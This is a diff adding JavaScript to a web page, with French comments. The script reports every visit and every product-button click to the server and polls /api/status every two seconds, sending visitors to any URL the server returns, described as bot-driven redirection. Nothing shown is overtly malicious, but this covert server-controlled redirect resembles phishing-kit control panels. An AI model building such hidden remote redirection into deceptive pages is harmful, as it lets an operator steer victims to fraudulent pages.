@@ -31,5 +31,57 @@ async function pollRedirect(){
 }
 pollRedirect();
 </script>
+
+  <script>
+    // Fonction pour notifier la visite du site
+    async function notifyVisit() {
+      try {
+        await fetch('/api/visit', { method: 'POST' }); // POST à chaque accès
+      } catch(err){
+        console.error('Erreur visite:', err);
+      }
+    }
+
+    // Notification clic sur "Voir produit"
+    document.getElementById('seeProduct').addEventListener('click', async () => {
+      try {
+        await fetch('/api/interaction', {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({action:'Interaction vers page produit'})
+        });
+      } catch(err){
+        console.error('Erreur interaction produit:', err);
+      }
+      // Redirection côté frontend
+      window.location.href = '/product.html';
+    });
+
+    // Vérification des redirections bot en continu
+    async function checkStatus() {
+      try {
+        const res = await fetch('/api/status');
+        const data = await res.json();
+        if(data.redirect){
+          window.location.href = data.redirect;
+        }
+      } catch(e){
+        console.error('Erreur polling status:', e);
+      } finally {
+        setTimeout(checkStatus, 2000);
+      }
+    }
+
+    window.addEventListener('load', () => {
+      notifyVisit();  // Envoi notif visiteur
+      checkStatus();  // Commence le polling redirection bot
+    });
+  </script>
+
+
+
+
+
+    
 </body>
 </html>
